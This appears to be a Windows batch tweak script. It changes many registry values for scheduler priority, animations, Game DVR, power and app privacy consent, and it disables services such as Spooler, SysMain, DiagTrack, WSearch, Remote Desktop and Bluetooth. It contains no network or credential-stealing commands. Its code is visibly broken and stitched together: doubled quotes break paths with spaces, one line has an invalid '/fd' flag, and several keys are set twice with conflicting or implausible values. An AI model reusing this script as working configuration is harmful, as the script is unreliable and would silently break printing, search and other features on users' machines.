Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "BackgroundPriority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\DisplayPostProcessing" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Priority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Distribution" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "BackgroundPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Priority" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Pro Audio" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "SFIO Priority" /t REG_SZ /d "Normal" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching" /v "SearchOrderConfig" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_AutoGameModeDefaultProfile" /t REG_BINARY /d "01000100000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "Win32_GameModeRelatedProcesses" /t REG_BINARY /d "010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabledDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "MenuShowDelay" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillAppTimeout" /t REG_SZ /d "5000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "HungAppTimeout" /t REG_SZ /d "4000" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "AutoEndTasks" /t REG_SZ /d "1" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "LowLevelHooksTimeout" /t REG_DWORD /d "4096" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "WaitToKillServiceTimeout" /t REG_DWORD /d "8192" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control" /v "WaitToKillServiceTimeout" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MinAnimate" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop\WindowMetrics" /v "MaxAnimate" /t REG_SZ /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ExtendedUIHoverTime" /t REG_DWORD /d "196608" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "DontPrettyPath" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ListviewShadow" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "TaskbarAnimations" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\DWM" /v "EnableAeroPeek" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DWM" /v "DWMWA_TRANSITIONS_FORCEDISABLED" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DWM" /v "DisallowAnimations" /t REG_DWORD /d "1" /f
Reg.exe add "HKCR\Paint.Picture\DefaultIcon" /ve /t REG_SZ /d "%%1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "DisableTaggedEnergyLogging" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxApplication" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxTagPerApplication" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "FontSmoothing" /t REG_SZ /d "2" /f
Reg.exe add "HKCU\Control Panel\Desktop" /v "FontSmoothingType" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MultitaskingView\AllUpView" /v "AllUpView" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MultitaskingView\AllUpView" /v "Remove TaskView" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "AltTabSettings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "BackgroundPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "GPU Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Audio" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "BackgroundPriority" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appointments"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCallHistory"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\email"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\userDataTasks"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\contacts"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\phoneCall"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\chat"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\appDiagnostics"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\documentsLibrary"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\picturesLibrary"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\videosLibrary"" /v ""Value"" /t REG_SZ /d ""Deny"" /f 
Reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\broadFileSystemAccess"" /v ""Value"" /t REG_SZ /d ""Allow"" /f 
Reg.exe add ""HKCU\Control Panel\Desktop"" /v ""HungAppTimeout"" /t REG_SZ /d ""1000"" /f
Reg.exe add ""HKCU\Control Panel\Desktop"" /v ""WaitToKillAppTimeout"" /t REG_SZ /d ""2000"" /f
Reg.exe add ""HKCU\SOFTWARE\Microsoft\GameBar"" /v ""GamePanelStartupTipIndex"" /t REG_DWORD /d ""3"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\GameBar"" /v ""AllowAutoGameMode"" /t REG_DWORD /d ""0"" /f 
reg add ""HKLM\System\CurrentControlSet\Services\PimIndexMaintenanceSvc"" /v ""Start"" /t REG_DWORD /d ""3"" /f
reg add ""HKLM\System\CurrentControlSet\Services\WinHttpAutoProxySvc"" /v ""Start"" /t REG_DWORD /d ""3"" /fd
Reg.exe add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback"" /v ""Scheduling Category"" /t REG_SZ /d ""High"" /f
Reg.exe add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Playback"" /v ""Scheduling Category"" /t REG_SZ /d ""Normal"" /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy"" /v ""LetAppsRunInBackground"" /t REG_DWORD /d ""2"" /f
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy"" /v ""LetAppsRunInBackground_UserInControlOfTheseApps"" /f
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy"" /v ""LetAppsRunInBackground_ForceAllowTheseApps"" /f
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy"" /v ""LetAppsRunInBackground_ForceDenyTheseApps"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\AnimateMinMax"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ComboBoxAnimation"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ControlAnimations"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\CursorShadow"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DragFullWindows"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DropShadow"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMAeroPeekEnabled"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMEnabled"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\DWMSaveThumbnailEnabled"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\FontSmoothing"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListBoxSmoothScrolling"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewAlphaSelect"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ListviewShadow"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\MenuAnimation"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\SelectionFade"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TaskbarAnimations"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\Themes"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\ThumbnailsOrIcon"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\VisualEffects\TooltipAnimation"" /v ""DefaultApplied"" /t REG_DWORD /d ""1"" /f
cls
sc config PrintNotify start= disabled
sc config Spooler start= disabled
cls
schtasks /Change /TN ""Microsoft\Windows\Printing\EduPrintProv"" /Disable
schtasks /Change /TN ""Microsoft\Windows\Printing\PrinterCleanupTask"" /Disable
wmic service where name='SysMain'  call ChangeStartmode Disabled
sc stop "SysMain"
wmic service where name='wisvc'  call ChangeStartmode Disabled
sc stop "wisvc"
wmic service where name='icssvc'  call ChangeStartmode Disabled
sc stop "icssvc"
wmic service where name='Fax'  call ChangeStartmode Disabled
sc stop "Fax"
wmic service where name='SessionEnv'  call ChangeStartmode Disabled
sc stop "SessionEnv"
wmic service where name='TermService'  call ChangeStartmode Disabled
sc stop "TermService"
wmic service where name='bthserv'  call ChangeStartmode Disabled
sc stop "bthserv"
wmic service where name='TabletInputService'  call ChangeStartmode Disabled
sc stop "TabletInputService"
wmic service where name='DiagTrack'  call ChangeStartmode Disabled
sc stop "DiagTrack"
wmic service where name='DPS'  call ChangeStartmode Disabled
sc stop "DPS"
wmic service where name='DoSvc'  call ChangeStartmode Disabled
sc stop "DoSvc"
wmic service where name='WpnService'  call ChangeStartmode Disabled
sc stop "WpnService"
wmic service where name='TrkWks'  call ChangeStartmode Disabled
sc stop "TrkWks"
wmic service where name='diagnosticshub.standardcollector.service'  call ChangeStartmode Disabled
sc stop "diagnosticshub.standardcollector.service"
wmic service where name='RemoteRegistry'  call ChangeStartmode Disabled
sc stop "RemoteRegistry"
wmic service where name='WSearch'  call ChangeStartmode Disabled
sc stop "WSearch"
cls
Reg.exe add ""HKCU\Control Panel\Desktop"" /v ""LowLevelHooksTimeout"" /t REG_SZ /d ""1000"" /f
Reg.exe add ""HKCU\Control Panel\Desktop"" /v ""MenuShowDelay"" /t REG_SZ /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control"" /v ""WaitToKillServiceTimeout"" /t REG_SZ /d ""2000"" /f
Reg.exe add ""HKCU\Control Panel\Desktop"" /v ""JPEGImportQuality"" /t REG_DWORD /d ""100"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\5e5da0cf-4a66-43a8-834e-b807e29f7358"" /v ""EnergyDriverPolicy"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\5e5da0cf-4a66-43a8-834e-b807e29f7358"" /v ""EnergyDriverPolicyVideo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\5e5da0cf-4a66-43a8-834e-b807e29f7358"" /v ""TimerBResolution"" /t REG_DWORD /d ""1"" /f
